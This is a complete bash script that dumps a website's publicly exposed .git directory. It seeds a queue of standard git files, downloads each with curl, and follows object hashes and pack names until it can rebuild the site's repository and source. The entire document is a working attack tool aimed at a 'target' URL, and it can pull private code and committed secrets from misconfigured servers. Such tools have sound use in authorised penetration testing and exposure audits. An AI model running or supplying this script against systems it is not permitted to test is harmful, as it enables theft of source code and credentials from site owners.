#!/bin/bash
#$1 : URL to download .git from (http://target.com/.git/)
#$2 : Folder where the .git-directory will be created
QUEUE=();
DOWNLOADED=();
BASEURL="$1";
BASEDIR="$2";
BASEGITDIR="$BASEDIR/.git/";

if [ $# -ne 2 ]; then
    echo "USAGE: http://target.tld/.git/ dest-dir";
    exit 1;
fi


if [[ ! "$BASEURL" =~ /.git/$ ]]; then
    echo "/.git/ missing in url";
    exit 0;
fi

if [ ! -d "$BASEGITDIR" ]; then
    echo "Destination folder does not exist";
    echo "Creating $BASEGITDIR";
    mkdir -p "$BASEGITDIR";
fi


function start_download() {
    #Add initial/static git files
    QUEUE+=('HEAD')
    QUEUE+=('objects/info/packs')
    QUEUE+=('description')
    QUEUE+=('config')
    QUEUE+=('COMMIT_EDITMSG')
    QUEUE+=('index')
    QUEUE+=('packed-refs')
    QUEUE+=('refs/heads/master')
    QUEUE+=('refs/remotes/origin/HEAD')
    QUEUE+=('refs/stash')
    QUEUE+=('logs/HEAD')
    QUEUE+=('logs/refs/heads/master')
    QUEUE+=('logs/refs/remotes/origin/HEAD')
    QUEUE+=('info/refs')
    QUEUE+=('info/exclude')

    #Iterate through QUEUE until there are no more files to download
    while [ ${#QUEUE[*]} -gt 0 ]
    do
        download_item ${QUEUE[@]:0:1}
        #Remove item from QUEUE
        QUEUE=( "${QUEUE[@]:1}" )
    done
}

function download_item() {
    local objname=$1
    local url="$BASEURL$objname"
    local hashes=()
    local packs=()

    #Check if file has already been downloaded
    if [[ " ${DOWNLOADED[@]} " =~ " ${objname} " ]]; then
        return
    fi

    local target="$BASEGITDIR$objname"

    #Create folder
    dir=$(echo "$objname" | grep -oE "^(.*)/")
    if [ $? -ne 1 ]; then
        mkdir -p "$BASEGITDIR/$dir"
    fi

    #Download file
    curl -k -s "$url" > "$target"
    
    #Mark as downloaded and remove it from the queue
    DOWNLOADED+=("$objname")
	echo "Downloaded: $objname"
	
	#Check if we have an object hash
	if [[ "$objname" =~ /[a-f0-9]{2}/[a-f0-9]{38} ]]; then 
		#Switch into $BASEDIR and save current working directory
		cwd=$(pwd)
		cd "$BASEDIR"
		
		#Restore hash from $objectname
		hash=$(echo "$objname" | sed -e 's~objects~~g' | sed -e 's~/~~g')
		
		#Check if it's valid git object
		git cat-file -t "$hash" &> /dev/null
		if [ $? -ne 0 ]; then
			#Delete invalid file
			cd "$cwd"
			rm "$target"
			return 
		fi
		
		#Parse output of git cat-file -p $hash
 		hashes+=($(git cat-file -p "$hash" | grep -oE "([a-f0-9]{40})"))

		cd "$cwd"
	fi 
	
    #Parse file for other objects
    hashes+=($(cat "$target" | grep -oE "([a-f0-9]{40})"))
    for hash in ${hashes[*]}
    do
        QUEUE+=("objects/${hash:0:2}/${hash:2}")
    done

    #Parse file for packs
    packs+=($(cat "$target" | grep -oE "(pack\-[a-f0-9]{40})"))
    for pack in ${packs[*]}
    do 
        QUEUE+=("objects/pack/$pack.pack")
        QUEUE+=("objects/pack/$pack.idx")
    done
}

start_download
